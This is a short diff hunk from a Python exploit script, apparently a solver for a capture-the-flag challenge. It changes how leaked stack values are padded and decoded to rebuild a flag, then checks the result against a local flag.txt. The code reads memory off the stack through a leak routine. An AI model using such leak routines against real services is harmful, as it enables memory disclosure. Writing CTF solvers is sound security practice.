@@ -142,10 +142,10 @@ def exploit() -> bool:
     # reconstructing the flag
     parts = []
     for i in range(0, 4):
-        parts.append(get_stack_var(io, indices["target"] + i)[:16])
+        parts.append(get_stack_var(io, indices["target"] + i)[:16].rjust(14, b'0'))
 
     flag = "".join(
-        map(lambda x: bytes.fromhex(x.decode("ascii")).decode("utf-8")[::-1], parts)
+        map(lambda x: bytes.fromhex(x.decode("ascii")).decode("ascii")[::-1], parts)
     )
 
     with open("./flag.txt", "r") as f_in:
